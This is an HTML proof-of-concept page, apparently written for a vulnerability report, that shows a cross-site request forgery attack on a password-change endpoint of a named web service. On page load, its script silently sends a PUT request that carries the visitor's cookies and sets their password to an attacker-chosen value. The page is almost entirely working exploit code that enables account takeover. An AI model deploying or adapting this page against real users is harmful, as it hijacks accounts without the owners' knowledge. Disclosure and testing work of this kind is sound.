<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>CSRF Test POC</title>
  </head>
  <body>
    <h1>If you see your password changed, the endpoint is vulnerable to CSRF.</h1>
    <script>
      // The malicious request that triggers a password change
      fetch('https://app.fing.com/rest/users/password', {
        method: 'PUT',
        credentials: 'include', // Ensures the victim's cookies are sent along
        headers: {
          'Content-Type': 'application/json',
          'Referer': 'https://app.fing.com/'
        },
        // Note the payload is just a raw JSON string representing the new password.
        body: '"Attacker12345678."'
      })
      .then(response => {
        if (response.ok) {
          console.log('Password change request sent successfully.');
        } else {
          console.log('Request failed with status:', response.status);
        }
      })
      .catch(error => console.error('Error:', error));
    </script>
  </body>
</html>
